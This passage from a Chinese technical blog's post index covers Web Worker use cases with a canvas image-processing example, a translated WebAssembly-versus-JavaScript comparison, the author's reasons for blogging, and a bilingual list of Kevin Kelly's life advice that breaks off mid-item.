+ e.message);}var worker = new Worker('workerWithError.js');worker.addEventListener('error', onError, false);worker.postMessage(); // 启动 worker 而不带任何消息 123self.addEventListener('message', function(e) { postMessage(x * 2); // 意图错误. 'x' 未定义}; 这里，你可以看到我们创建了一个 worker 然后开始监听 error 事件。 在 worker 中（在 workerWithError.js 中），我们通过未在作用域中定义的 x 乘以 2 来创建一个意图错误。异常会传播到初始化脚本（即主页面中）然后调用 onError 并传入关于错误的信息。 Web Workers 最佳使用场景迄今为止，我们列举了 Web Workers 的长处及其限制。让我们看看他们的最佳使用场景： 光线追踪：光线追踪是一项通过追踪从眼睛发出的光线的路径作为像素来生成图片的渲染技术。Ray tracing 使用 CPU 密集型计算来模仿光线的路径。思路即模仿一些诸如反射，折射，材料等的效果。所有的这些计算逻辑可以放在 Web Worker 中以避免阻塞 UI 线程。甚至更好的方法即－你可以轻易地把把图片的渲染拆分在几个 workers 中进行（即在各自的 CPU 中进行计算，意思是说利用多个 CPU 来进行计算，可以参考下 nodejs 的 api）。这里有一个使用 Web Workers 来进行射线追踪的简单示例－https://nerget.com/rayjs-mt/rayjs.html。 加密：端到端的加密由于对保护个人和敏感数据日益严格的法律规定而变得越来越流行。加密有时候会非常地耗时，特别是如果当你需要经常加密很多数据的时候（比如，发往服务器前加密数据）。这是一个使用 Web Worker 的绝佳场景，因为它并不需要访问 DOM 或者利用其它魔法－它只是纯粹使用算法进行计算而已。一旦在 worker 进行计算，它对于用户来说是无缝地且不会影响到用户体验。 预加载数据：为了优化网站或者网络应用及提升数据加载时间，你可以使用 Workers 来提前加载部分数据以备不时之需。Web Workers 不像其它技术，在这种情况下不会影响程序的使用体验。 渐进式网络应用：即使在网络不稳定的情况下，它们必须快速加载。这意味着数据必须本地存储于浏览器中。这时候 IndexDB 及其它类似 API 就派上用场了。大体上说，一个客户端存储是必须的。为了不阻塞 UI 线程的渲染，这项工作必须由 Web Workers 来执行。呃，当使用 IndexDB的时候，可以不使用 workers 而使用其异步接口，但是之前它也含有同步接口（可能会再次引入 ），这时候就必须在 workers 中使用 IndexDB。 这里需要注意的是在现代浏览器已经不支持同步接口了，具体可查看这里。 拼写检查：一个基本的拼写检测器是这样工作的－程序会读取一个包含拼写正确的单词列表的字典文件。字典会被解析成一个搜索树以加快实际的文本搜索。当检查器检查一个单词的时候，程序会在预构建搜索树中进行检索。如果在树中没有检索到，则会通过提供替代的字符为用户提供替代的拼写并检测单词是否是有效－是否是用户需要的单词。这个检索过程中的所有工作都可以交由 Web Worker 来完成，这样用户就只需输入单词和语句而不会阻塞 UI，与此同时 worker 会处理所有的搜索和服务建议。 在 SessionStack 中对于我们来说性能和可靠性是至关重要的。之所以这么重要的原因是一旦把 SessionStack 整合进网络应用，它就会开始收集从 DOM 变化，用户交互到网络请求，未处理异常和调试信息的所有一切信息。所有的数据都是即时传输到我们的服务器的，这样就允许你以视频的方式重放网络应用中的所有问题以及观察用户端产生的一切问题。所有的一切都只会给程序带来极小的延迟且没有任何的性能开销。 这就是为什么我们使用 Web Workers 来处理监视库和播放器的逻辑的原因，因为 Web Workers 会帮我们处理诸如使用哈希来验证数据完整性，渲染等 CPU 密集型的任务。 在这个网络技术日新月异的时代，我们更加努力地保证 SessionStack 轻巧且不会给用户程序带来任何性能影响。 扩展实际工作过程会遇到用户需要通过解析远程图片来获得图片 base64 的案例，那么这时候，如果图片非常大，就会造成 canvas 的 toDataURL 操作相当的耗时，从而阻塞页面的渲染。 所以解决思路即把这里的处理图片的操作交由 worker 来处理。以下贴出主要的代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;!DOCTYPE html&gt;&lt;html lang=\"zh-cn\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Canvas to base64&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; function loadImageAsync(url) { if (typeof url !== 'string') { return Promise.reject(new TypeError('must specify a string')); } return new Promise(function(resolve, reject) { const image = new Image(); // 允许 canvas 跨域加载图片 image.crossOrigin=\"anonymous\"; image.onload = function() { const $canvas = document.createElement('canvas'); const ctx = $canvas.getContext('2d'); const width = this.width; const height = this.height; let imageData; $canvas.width = width; $canvas.height = height; ctx.drawImage(image, 0, 0, width, height); imageData = ctx.getImageData(0, 0, $canvas.width, $canvas.height); resolve({image, imageData}); }; image.onerror = function() { reject(new Error('Could not load image at ' + url)); }; image.src = url; }); } function blobToDataURL(blob) { return new Promise((fulfill, reject) =&gt; { let reader = new FileReader(); reader.onerror = reject; reader.onload = (e) =&gt; fulfill(reader.result); reader.readAsDataURL(blob); }) } document.addEventListener(\"DOMContentLoaded\", function () { loadImageAsync('https://cdn-images-1.medium.com/max/1600/1*4lHHyfEhVB0LnQ3HlhSs8g.png') .then(function (image) { // jpeg-web-worker.js https://github.com/kentmw/jpeg-web-worker const worker = new Worker('jpeg-web-worker.js'); worker.postMessage({ image: image.imageData, quality: 50 }); worker.onmessage = function(e) { // e.data is the imageData of the jpeg. {data: U8IntArray, height: int, width: int} // you can still convert the jpeg imageData into a blog like this: const blob = new Blob( [e.data.data], {type: 'image/png'} ); blobToDataURL(blob).then((imageURL) =&gt; { console.log('imageUrl:', imageURL); }) } }) .catch(function (err) { console.log('Error：', err.message); }); }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;","link":"/posts/6edf3adc.html"},{"title":"WebAssembly对比JavaScript及其使用场景","text":"How JavaScript works: A comparison with WebAssembly + why in certain cases it’s better to use it over JavaScript 原文请查阅这里，略有改动。 本章中，我们将剖析 WebAssembly 的工作原理，更重要的是它与 JavaScript 在性能方面的比对：包括加载时间，执行速度，垃圾回收，内存使用，平台 API 访问性，调试，多线程以及可移植性等方面。 我们构建网页应用的方式已经在改革边缘－现在只是开端但我们对于网络应用的思考正在发生改变。 WebAssembly简介WebAssembly（又称 wasm） 是一种用于网络的高效，底层字节码。 WASM 让你在其使用 JavaScript 以外的语言（比如 C, C++, Rust 及其它）来编写应用程序，然后编译成（提早） WebAssembly。 构建出来的网络应用加载和运行速度都会非常快。 加载时间为了加载 JavaScript，浏览器必须加载所有文本格式的 js 文件。 浏览器可以更快地加载 WebAssembly，因为只有已编译的 wasm 文件需要通过网络传输。而且 wasm 是底层的类汇编语言，具有非常紧凑的二进制格式。 执行速度如今 Wasm 运行速度只比Native 代码慢 20%。无论如何，这是令人惊喜的结果。这种格式会被编译进沙箱环境中且在大量约束条件下运行以保证没有任何安全漏洞或者使之强化。和真正的原生代码比较，稍慢的执行速度几乎可以忽略。在可预见的未来运行速度将会更快。 本地代码（native code）是计算机编程（代码），编译用来运行一个特殊的处理器（如英特尔x86级的处理器）和它的特殊指令集。如果同一个程序在不同的处理器上执行的话软件就必须能够模拟出旧的处理器的指令。这种情况下，同一个程序是在模拟模式下运行的，这样就会导致它比在本机模式下运行速度慢。（这个程序可以重写并且重新编译这样就可以用新的处理器执行本机模式了。） 更棒的是，它具备很好的浏览器兼容特性－所有主流浏览器引擎都添加了对 WebAssembly 的支持 且运行速度相差无几。 为了理解和 JavaScript 对比，WebAssembly 的执行速度有多快，你应该首先阅读之前的 JavaScript 引擎工作原理的文章。 让我们快速浏览下 V8 的运行机制： 在左边是包含 JavaScript 函数的 JavaScript 源码。首先，需要对源码解析并将所有字符串转换成令牌，之后生成语法抽象树。 语法抽象树是 JavaScript 程序逻辑的内存表示形式。生成后, V8 直接进入机器码阶段。基本上是遍历树，生成机器码然后获得编译后的函数。这里没有任何真正的方法可以加速这一过程。 现在，我们来看 V8 管道下一阶段的工作内容： 现在，我们有 TurboFan ，V8 的优化编译程序之一。当 JavaScript 程序运行时，大量的代码在 V8 内部运行。当运行缓慢时 TurboFan 会监控引起性能瓶颈的地方及热点（内存使用过高的地方）以便优化它们。它把以上监视的结果推向后方-即优化过的即时编译器，该编译器把消耗大量 CPU 资源的函数转换为性能更优的代码。 它解决了性能问题，但缺点即是分析代码及辨别哪些代码需要优化的过程也会消耗 CPU 资源。这意味着更多的耗电量，特别是移动设备。 但是，wasm 并不需要以上步骤－如下所示直接插入至工作流中： wasm 在编译阶段就已经通过进行了代码优化。所以解析阶段也不存在了。有了优化后的二进制代码可以直接放入 JIT 并生成机器码。编译器在前端就完成了所有代码优化。 由于跳过了编译过程中的不少步骤，这使得 wasm 的执行更加高效。 内存模型 一个 C++ 的程序的内存被编译为 WebAssembly，它是整段连续的没有空洞的内存块。wasam 中有一个用来提升代码安全的功能即执行栈和线性内存隔离的概念。在 C++ 程序中，有一块堆区，从其底部分配内存，然后从其顶部获得内存来增加栈的大小。这样有可能用一个指针在栈内存中遍历以操作你不应该碰的变量。 这是许多恶意软件加以利用的漏洞。 WebAssembly 采用了完全不同的内存模型。执行栈和 WebAssembly 程序本身是隔离的，所以你无法从内部进行修改和改变诸如变量值。而且函数使用整数偏移而不是指针。函数指向一个间接函数表。然后这些直接的计算出的数字指向模块中的函数。它是通过这种方式构建的，这样你就可以同时加载多个 wasm 模块，偏移所有索引且每个模块都运行良好。 更多关于 JavaScript 内存模型和管理的文章详见。 垃圾回收你已经知晓 JavaScript 的内存管理是由垃圾回收器处理。 WebAssembly 有点不一样。它支持手动操作内存的语言，也可以在 wasm 模块中内置自已的内存垃圾回收器，但这很复杂。 目前，WebAssembly 是围绕 C++ 和 RUST 的使用场景设计的。由于 wasm 处于底层，这意味着只比汇编语言高一级的编程语言会容易被编译成 WebAssembly很合理。C 语言可以使用 malloc，C++ 可以使用智能指针，Rust 则使用完全不同的范式（一个完全不同的话题）。这些语言没有使用垃圾回收器，所以他们不需要所有复杂运行时的东西来追踪内存。WebAssembly 自然就很适合这些语言。 另外，这些语言并不能 100% 地应用于复杂的 JavaScript 使用场景, 如修改 DOM 。用 C++ 来写整个的 HTML 程序是毫无意义的因为 C++ 并不是为此而生。大多数情况下，工程师用使用 C++ 或 Rust 来编写 WebGL 或者高度优化的库（比如包含大量的数学运算）。 将来 WebAssembly 将支持无内置垃圾回功能的的语言。 平台接口访问依赖于执行 JavaScript 的运行时，可以通过 JavaScript 程序来直接访问这些平台暴露的指定接口。你的 JavaScript 网络应用可以调用一系列的网页接口来控制浏览器／设备的功能且访问 DOM，CSSOM，WebGL，IndexedDB，Web Audio API 等等。 然而，WebAssembly 模块没用访问任何平台的接口权限。这一切都得由 JavaScript 来进行协调。如果你想在 WebAssembly 模块内访问一些指定平台的接口得通过 JavaScript 来进行调用。 比如你想要使用 console.log，你就得通过JavaScript 而不是 C++ 代码来进行调用。而这些 JavaScript 调用会产生一定的性能损失。 但并非总是如此，规范将会为在未来为 wasm 提供访问指定平台的接口，这样你就可以完全在程序中不使用 JavaScript。 源码映射当压缩 JavaScript 代码时，你需要有合适的方法来进行调试。 这时候源码映射就派上用场了。 大体上，源码映射就是把合并／压缩的文件映射到未构建状态的一种方式。当为生产环境进行代码构建的时候，与压缩和合并 JavaScript 一起，会生成源码映射用来保存原始文件信息。当你想在生成的 JavaScript 代码中查询特定的行和列的代码的时候，可以在源码映射中进行查找以获得代码的原始位置。 由于没有规范定义源码映射，所以目前 WebAssembly 并不支持，但最终会有的（可能快了）。 当在 C++ 代码中设置了断点，就会看到 C++ 代码而不是 WebAssembly。至少，这是 WebAssembly 源码映射的目标吧。 多线程JavaScript 是单线程的。有很多方法来利用事件循环和使用在之前的文章中有提到的异步编程。 JavaScript 也使用 Web Workers 但是只有在极其特殊的场景下－可以把任何可能阻塞 UI 主线程的密集 CPU 计算移交给 Web Worker 执行以获得更好的性能。但是，Web Worker 不能够访问 DOM。 目前 WebAssembly 不支持多线程。但是，这有可能是接下来 WebAssembly 要实现的。Wasm 将会接近实现原生的线程（比如，C++ 风格的线程）。拥有真正的线程将会在浏览器中创造出很多新的机遇。当然这也会增加滥用的可能性。 时隔数年，目前已经有 WebAssembly 的多线程规范支持了。 可移植性现在 JavaScript 几乎可以运行于任意的地方，从浏览器到服务端甚至在嵌入式系统中。 WebAssembly 设计旨在安全性和可移植性。正如 JavaScript 那样。它将会在任何支持 wasm 的环境（比如每个浏览器）中运行。 WebAssembly 拥有和早年 Java 使用 Applets 来实现可移植性的同样的目标。 WebAssembly 使用场景WebAssembly 的最初版本主要是为了解决大量受CPU限制的计算（比如处理数学问题）。最为主流的使用场景即游戏－大量的像素处理。 CPU-bound 指的是你的程序受到CPU影响，CPU更快的话你的程序也会更快 你可以使用你熟悉的 OpenGL 来编写 C++/Rust 程序，然后编译成 wasm。之后就可以在浏览器中运行。 浏览下（在Firefox中运行）－http://s3.amazonaws.com/mozilla-games/tmp/2017-02-21-SunTemple/SunTemple.html。这是运行于Unreal engine（这是一个可以用来开发虚拟现实的开发套件）中的。 另一个合理使用 WebAssembly （高性能）的情况即实现一些处理CPU密集型的库。比如，一些图形操作。 正如之前所提到的，wasm 可以有效减少移动设备的电力损耗（取决于引擎），这是由于大多数步骤已经在编译阶段提前处理完成。 未来，你可以直接使用 WASM 二进制库即使你没有编写编译成它的代码。你可以在 NPM 上面找到一些开始使用这技术的项目。 针对操作 DOM 和频繁使用平台接口的情况 ，使用 JavaScript 会更加合理，因为它不会产生额外的性能开销且它原生支持各种接口。","link":"/posts/6f537ab8.html"},{"title":"为什么我要写博客","text":"记过一些读书笔记，看过技术专栏，喜欢看些稀奇古怪的玩意。但总感觉需要用的时候这些知识只是埋藏在大脑深处，归根结底这些都是碎片信息。 碎片信息为了达到易于习得/传播的目的，将复杂的事物简单化就是最佳手段。它们往往只告诉你表面的东西，而产生的动机，背后的原理以及它与其他事物之间的联系却鲜有人问津。所以并不是“书到用时方恨少”，而是缺少一个知识检索系统。 知识的积累是长期化、碎片化的过程。个人博客建站就是对已有知识体系进行梳理、分类归档，校验并输出的一个载体。 本站基于Hexo和 Github page 生成,想了解Hexo建站相关知识可以查看这里，下面一段是建站背景，不想了解可以直接跳过。 建站背景一年前无意中发现一个很有逼格的个人博客 surmon.me。作为一名野生程序员，拥有自己的博客这个想法随即埋下了萌芽。 这位大佬的博客很炫酷，前后端，移动端，管理端一应俱全。对于当时立志全栈工程师的我具有莫大的吸引力，对于拓宽知识面，掌握新技术栈也有帮助，但这也是使我陷入一段痛苦时期的开端…原因如下 产品开发流程不明确：因为是自己业余尝试的项目，没有对整个开发流程规范化，每个阶段该做的事情没有明确； 技术栈飘忽不定：比如展示页面用了Vue，博客需要服务端渲染还是用下Vue的服务端渲染框架nuxt吧？博客用了Vue，那后台管理系统试下React吧？服务端还用javascript，试试其他服务端语言，用下go吧？这样的场景还有很多，切记不要为了追求新技术而学技术，很容易变成“全菜工程师”。 好奇害死猫：在搭建项目的过程中，有需要参考其他博客的场景。导致了”嗯，这个功能不错，必须整一个”，需求不定时增加导致无限延期，我要是个产品经理估计狗头都要被打爆… 过分注重细节，提前优化：提前的优化是万恶之源，特别是项目尚未成型亦或者你对需求还不明确的时候； 高估自己的精力：由于水平和精力有限，项目在业余时间经常提供不了正反馈，热情逐渐被浇灭。 痛定思痛，最后及时止损决定改为用Hexo建站，挑了个简约不失优雅的主题 hexo-theme-icarus ，专注于先有个博客为目标而不是工作之余尝试新技术，先把博客搭起来走出第一步才是关键。 展望对于博客未来的展望和自己的要求： 逐步建立自己的知识体系，少看碎片化知识，漫无目的地接受碎片化知识学习效果可以忽略不计。要有点功利性，带着目标去学习。 不要盲目学习新技术/KPI 项目，同类框架实际上大同小异，市场自然会优胜略汰，要把精力用来学习需要的技术。 少看二手知识(包括路过的人看本篇文章也一样)，简言之，对获取知识的来源筛选要求要尽量高，这也是程序员推荐翻墙和学好英语的原因。 之后可能会写写如何自学英语，看过的书籍和Ted演讲，leecode，程序员该掌握的医学知识等杂七杂八的东西。或者其他自己感兴趣的、但尚未进行探索和了解的知识点, 体会将无序的输入逐渐过渡为主动筛选的感兴趣的知识由点到线，最后到能展示给“别人看”的过程。 第一篇博文，给自己点鼓励，希望能单纯为了自己的热爱去写点东西，谈不上努力，谈不上坚持。 完。","link":"/posts/bfe2ba5b.html"},{"title":"KK 给年轻人的一些人生建议","text":"本文大部分内容来自赵嘉敏老师《凯文·凯利人生建议译文》，略有修改，链接在文末。 工作及方法论 充满热情抵得上 25 点智商。 Being enthusiastic is worth 25 IQ points. 虽然百分之一的灵感更重要，但以大多数人的努力程度之低，根本轮不到拼天赋。 做任何事都应该定下期限。它可以帮你排除那些无关紧要之事，并避免追求尽善尽美，而是努力去做到与众不同。差异胜于完美。 Always demand a deadline. A deadline weeds out the extraneous and the ordinary. It prevents you from trying to make it perfect, so you have to make it different. Different is better. 毕业几年一个深刻体会：样样都追求等于样样不精。 一个有意义的年度目标是去充分了解一个话题。这样，（到了年底的时候，）你就会对一年前的无知感到难以置信。 A worthy goal for a year is to learn enough about a subject so that you can’t believe how ignorant you were a year earlier. 所谓高手，不过是善于在跌倒后优雅起身的菜鸟而已。 Pros are just amateurs who know how to gracefully recover from their mistakes. 将创造和改进分开。你不可能在写做的同时进行编辑，也不可能在凿刻的同时进行打磨，更不可能在制造的同时进行分析。如果你这么做，求善之心就会打断创造之意。创新时就要忘掉已有方案；勾勒草图时就不能太着眼于细处。写作时，先打草稿而不要去抠细节。在新事物之初，创意的思想必须得到无拘无束的释放。 Separate the processes of creation from improving. You can’t write and edit, or sculpt and polish, or make and analyze at the same time. If you do, the editor stops the creator. While you invent, don’t select. While you sketch, don’t inspect. While you write the first draft, don’t reflect. At the start, the creator mind must be unleashed from judgement. 如果你从未跌倒过，那么你也就从未努力过。 If you are not falling down occasionally, you are just coasting. 你的所作所为定义了你——既不是你所说的，也不是你所信的，更不是你所支持的，而是你花费时间于其上的。 You are what you do. Not what you say, not what you believe, not how you vote, but what you spend your time on. 没有最好，只有更好。个人的天分有高有低，但不论高低，自身的提升都永无止境。 There is no limit on better. Talent is distributed unfairly, but there is no limit on how much we can improve what we start with. 任何一项大工程（修房子、拍电影、开发 app）完成度为 90% 的时候，你都要做好心理准备：剩余的大量细节工作会占掉你另一段与之前相当的时间。 Be prepared: When you are 90% done any large project (a house, a film, an event, an app) the rest of the myriad details will take a second 90% to complete. 真实，但要不要做最后的 10 % 还得看收益情况。 如果你只是迫切需要一份工作，那么对老板来说，你不过是又一个问题。如果你能解决老板的很多问题，那你自然能得到这份工作。要得到一份工作，需要像老板一样去想问题。 If you desperately need a job, you are just another problem for a boss; if you can solve many of the problems the boss has right now, you are hired. To be hired, think like your boss. 不要在电话上答应任何请求或提议。所谓的紧急不过是个假象。 Don’t ever respond to a solicitation or a proposal on the phone. The urgency is a disguise. 经验往往被高估了。招募的时候，要看资质，技能则可以培训。许多令人惊奇和赞叹的事情，都是由第一次做的人做出来的。 Experience is overrated. When hiring, hire for aptitude, train for skills. Most really amazing or great things are done by people doing them for the first time. 买工具时，起步阶段一定要买最便宜的。升级那些使用频次高的工具。如果你的工具是用于工作，那么买你能买得起的最好的。 Buying tools: Start by buying the absolute cheapest tools you can find. Upgrade the ones you use a lot. If you wind up using some tool for a job, buy the very best you can afford. 学会毫不尴尬地打 20 分钟小盹儿。 Learn how to take a 20-minute power nap without embarrassment. 20-minute power nap 通常指午后 20～30 分钟的小憩。近期有研究表明，20-minute power nap 有助于提振情绪，提升专注度和创造力。 成功的秘诀：不要承诺太满，而要超预期交付。 Recipe for success: under-promise and over-deliver. 预料中的失败算不上失败。 If something fails where you thought it would fail, that is not a failure. 不要被事情的紧急性牵着鼻子走，而要看它的重要性。 Be governed not by the tyranny of the urgent but by the elevation of the important. 不要为了赚钱而去做事；而是为了做事去赚钱。干好工作的回报是有更多的工作。 Don’t create things to make money; make money so you can create things. The reward for good work is more work. 在所有事情（除了爱情）开始时做好退出计划。为结局做准备。几乎任何事情都是陷入易而抽身难。 In all things — except love — start with the exit strategy. Prepare for the ending. Almost anything is easier to get into than out of. 哈哈，除了爱情，可以说求生欲非常强了。 绝大多数一夜之间的功成名就——事实上，任何显著的成就——都要经过至少五年（的准备）。请据此来规划你的人生。 Most overnight successes — in fact any significant successes — take at least 5 years. Budget your life accordingly. 在与他人一起头脑风暴或是即兴创作时，用令人鼓舞的“没错——而且”——而非令人泄气的“不——可是”——来回应每一条贡献，那你就能走得更深更远。 When brainstorming, improvising, jamming with others, you’ll go much further and deeper if you build upon each contribution with a playful “yes — and” example instead of a deflating “no — but” reply. 工作是为了成长而非获取。 Work to become, not to acquire. 值得多念两遍：量两次，切一次。 Worth repeating: measure twice, cut once. 嗯，三思而后行。 如果你不知道自己迫切想要什么的话，那么答案很可能是“睡上一觉”。 If you can’t tell what you desperately need, it’s probably sleep. 通过改变行为而改变想法，要比通过改变想法来改变行为容易得多。去实践你所寻求的改变。 It is much easier to change how you think by changing your behavior, than it is to change your behavior by changing how you think. Act out the change you seek. 不要太在意从哪儿或是如何开始。只要不停前进，你的成就将远远超越你的起点。 Don’t worry how or where you begin. As long as you keep moving, your success will be far from where you start. 没有行动计划的目标只不过是白日梦。 If your goal does not have a schedule, it is a dream. 一段讲话中能被人记住的点不超过三个。 People can’t remember more than 3 points from a speech. 我所仰慕的人，读的书都比我多。 I have never met a person I admired who did not read more books than I did. 实践出真知。 The greatest teacher is called “doing”. 每件事在变得容易之前都是很难的。某个想法在取得突破之前都会显得很愚蠢。 Everything is hard before it is easy. The day before something is a breakthrough, it’s a stupid idea. 碰到卡壳的时候就睡上一觉。让潜意识来帮你解决问题。 When you are stuck, sleep on it. Let your subconscious work for you. 事情是做不完的，但时间是有限的。你不可能不去做事儿，但你可以控制你的时间。时间是你唯一能掌控的事情。 Your work will be endless, but your time is finite. You cannot limit the work so you must limit your time. Hours are the only thing you can manage. 在任何事情上都要精打细算，唯有你的热情无需如此。 Be frugal in all things, except in your passions splurge. 做事留出裕量——多备些材料和部件，多留些空间和时间，多做些成品。这些裕量可以弥补错误、减轻压力，并可放入仓库以备将来所需。裕量是最便宜的保险。 When making something, always get a few extras — extra material, extra parts, extra space, extra finishes. The extras serve as backups for mistakes, reduce stress, and fill your inventory for the future. They are the cheapest insurance. 别把你的邮件收件箱当 to-do list 来用。 Don’t let your email inbox become your to-do list. 找一件简单的事情——任何事情，极其认真地对待它，仿佛它是世界上唯一的事情。只要认真对待，你就能照亮天空。 Take one simple thing — almost anything — but take it extremely seriously, as if it was the only thing in the world, or maybe the entire world is in it — and by taking it seriously you’ll light up the sky. 实用技巧 非同寻常的观点要有非同寻常的证据，才能令人信服。 Extraordinary claims should require extraordinary evidence to be believed. 别做最好的。做唯一的。 Don’t be the best. Be the only. 别成为一群人里最聪明的那个。和那些比你聪明的人待在一起，向他们学习。如果能找到和你观点相左的聪明人，那就更好了。 Don’t be the smartest person in the room. Hangout with, and learn from, people smarter than yourself. Even better, find smart people who will disagree with you. 对话的“3 原则”：想要摸清一个人的真正意图，请他就刚才所说再深入一些，如此反复，直到第三遍，你所得到的就近于真相了。 Rule of 3 in conversation. To get to the real reason, ask a person to go deeper than what they just said. Then again, and once more. The third time’s answer is close to the truth. 在你年轻的时候，至少花六个月到一年的时间，尽可能穷地过日子，尽可能少地拥有身外之物，居陋室而箪食瓢饮，以体验你可能会经历的最穷困潦倒的生活。这样，当你在将来需要行冒险之事时，就不至于为最糟糕的情况而忧心不已。 When you are young spend at least 6 months to one year living as poor as you can, owning as little as you possibly can, eating beans and rice in a tiny room or tent, to experience what your “worst” lifestyle might be. That way any time you have to risk something in the future you won’t be afraid of the worst case scenario. 了解事物发展的下限，最差的结果能够接受那么也能坦然面对大部分困难。 研究的“数字 7 原则”：当你愿意就一个问题深入七层时，总能找到你想要的答案。如果你求教的第一层人不知道，那么就问问他们应该去找谁。如此追索下去。到第七层时，通常都会如愿以偿。 Rule of 7 in research. You can find out anything if you are willing to go seven levels. If the first source you ask doesn’t know, ask them who you should ask next, and so on down the line. If you are willing to go to the 7th source, you’ll almost always get your answer. 在你不知道自己真正的激情所在时，追寻心之所向往往会带你误入歧途。对年轻人来说，更好的格言是：“精通一件事，任何事。”在精通一件事的过程中，你可以顺着带给你更多快乐的方向继续深入，并最终发现你的心之所向。 Following your bliss is a recipe for paralysis if you don’t know what you are passionate about. A better motto for most youth is “master something, anything”. Through mastery of one thing, you can drift towards extensions of that mastery that bring you more joy, and eventually discover where your bliss is. 做一件没有人能说清楚的事儿会带给你最大的回报。但凡有可能的话，去做一件还未被人们谈及的事情。 The greatest rewards come from working on something that nobody has a name for. If you possibly can, work where there are no words for what you do. 要以获得他人的尊重而非喜爱为目标。 Don’t aim to have others like you; aim to have them respect you. 职场新人容易陷入的误区。 思想 任何真实之物都源于虚构之意。想象是宇宙中最强大的力量，也是你能够日益精进的能力。生命中可以因不知众人所知而获益的能力，仅此一项。 Anything real begins with the fiction of what could be. Imagination is therefore the most potent force in the universe, and a skill you can get better at. It’s the one skill in life that benefits from ignoring what everyone else knows. 当危机和灾难来袭时，别错过他们。没有问题，就没有进步。 When crisis and disaster strike, don’t waste them. No problems, no progress. 我敢肯定，我今天确信的很多事情在 100 年后都会被证明是错误的，甚至是错得离谱。而我非常努力在做的事情，就是去识别我对今天的错误认知。 I’m positive that in 100 years much of what I take to be true today will be proved to be wrong, maybe even embarrassingly wrong, and I try really hard to identify what it is that I am wrong about today. 从长远来说，未来取决于乐观主义者。成为一个乐观主义者并非要对我们制造的问题视而不见，而是要想象如何提升我们解决问题的能力。 Over the long term, the future is decided by optimists. To be an optimist you don’t have to ignore all the many problems we create; you just have to imagine improving our capacity to solve problems. 整个宇宙都在背后为你而谋划。要相信，天助人愿。 The universe is conspiring behind your back to make you a success. This will be much easier to do if you embrace this pronoia. pronoia 是 paranoia 的反义词。Paranoia 可以译为“迫害妄想症”，也即觉得所有人、所有事都与自己为敌的心理状态。 儿时让你显得出格的事情会让你成年后与众不同——只要你还没有丢掉它。 That thing that made you weird as a kid could make you great as an adult — if you don’t lose it. 可惜大部分人都被按部就班的学习、工作中被磨灭了棱角。儿时就敢于打破循规蹈矩的资本来源于原生家庭。 成熟的基本要素：不因事不关己而高高挂起。 The foundation of maturity: Just because it’s not your fault doesn’t mean it’s not your responsibility. 无数个糟糕的想法中才能诞生一个好想法。 A multitude of bad ideas is necessary for one good idea. 有智慧意味着有更多的问题而非答案。 Being wise means having more questions than answers. 历史上最严重的罪行总是由那些真心相信自己在与邪恶战斗的人而犯下的。警惕与邪恶做斗争。 The worst evils in history have always been committed by those who truly believed they were combating evil. Beware of combating evil. 成为你想要看见的改变。 Be the change you wish to see. 生活的欲望应与自身相匹配，但生命的意义应超越自我。致力于那些超越自我的事情。 Your passion in life should fit you exactly; but your purpose in life should exceed you. Work for something much larger than yourself. 智者不多言。 Always say less than necessary.【原文出自美国作家罗伯特·格林（Robert Greene）的《权力的 48 条法则》（The 48 Laws of Power）。意思是说，当你试图用言语打动他人时，说得越多，越显得你所言之事平淡无奇。要少言，要留白。 上天赋予你生命，是要你来发现你的天赋所在。当你找到你的使命时，你就完成了你的使命。这并非自相矛盾，而是道之所在。 You are given the gift of life in order to discover what your gift in life is. You will complete your mission when you figure out what your mission is. This is not a paradox. This is the way. 坏事无常，好事多磨。 Bad things can happen fast, but almost all good things happen slowly. 生命中所有最重要的收益——不论是财富、人际关系还是知识——都来自于神奇的复利，它可以将持续的微小收益进一步放大。你所要做的，就是在日常基础上，持之以恒地加上 1%。 All the greatest gains in life — in wealth, relationships, or knowledge —come from the magic of compounding interest — amplifying small steady gains. All you need for abundance is to keep adding 1% more than you subtract on a regular basis. 人们之所以会错过重大突破，是因为它们看着就很难。 The greatest breakthroughs are missed because they look like hard work. 有限的游戏旨在分出胜负；无限的游戏旨在让游戏继续进行下去。去寻找那些无限的游戏，因为它们能带给你无尽的回报。 Finite games are played to win or lose. Infinite games are played to keep the game going. Seek out infinite games because they yield infinite rewards. 逆水行舟，不进则退。 Many backward steps are made by standing still. 当下是创造的最佳时机。未来二十年内最伟大、最酷炫的发明尚未诞生。你一点儿都不晚。 This is the best time ever to make something. None of the greatest, coolest creations 20 years from now have been invented yet. You are not late. 不经历风雨，怎能见彩虹。 No rain, no rainbow. 历史告诉我们，今天我们相信的很多道理一百年后都将不再正确。今天给自己提的一个好问题就是：“我有哪些看法可能是错的？” History teaches us that in 100 years from now some of the assumptions you believed will turn out to be wrong. A good question to ask yourself today is “What might I be wrong about?” 艺术 艺术藏身于所忽略的细节中。 Art is in what you leave out. 耶稣、超人和特蕾莎修女搞不了艺术。只有不完美的存在才能创作艺术，因为艺术始于残缺。 Jesus, Superman, and Mother Teresa never made art. Only imperfect beings can make art because art begins in what is broken. 生活/好习惯 习惯的意义在于无需再为某类行为纠结，不用再为要不要做它而费思量。做就是了。讲真话和用牙线都属于好习惯。 The purpose of a habit is to remove that action from self-negotiation. You no longer expend energy deciding whether to do it. You just do it. Good habits can range from telling the truth, to flossing. 想做好一件事，做就是了。想把一件事做到令人称颂，那就再来一遍，再来一遍，再来一遍。把事情做到极致的秘诀在于不停地重做。 To make something good, just do it. To make something great, just re-do it, re-do it, re-do it. The secret to making fine things is in remaking them. 铁杵磨成针。 如果你在房间里遍寻某样东西并最终找到的话，那么用完后不要放回你找到它的地方，而是放到你最初找它的地方。 If you are looking for something in your house, and you finally find it, when you’re done with it, don’t put it back where you found it. Put it back where you first looked for it. 当你找不到一样东西时，它往往就在上次现身之处的一臂之内。仔细搜寻这个范围，你就能找到它。 When an object is lost, 95% of the time it is hiding within arm’s reach of where it was last seen. Search in all possible locations in that radius and you’ll find it. 清除杂物，为真正重要的东西腾出空间。 Eliminating clutter makes room for your true treasures. 学会如何打称人结。练习在黑暗中打；练习用一只手打。你会发现今后用到它的地方要远超出你的想象。 Learn how to tie a bowline knot. Practice in the dark. With one hand. For the rest of your life you’ll use this knot more times than you would ever believe. 穿过一扇门后，保持它原来开或合的状态。 Leave a gate behind you the way you first found it. 阳台至少应该有两米宽才有用。 A balcony or porch 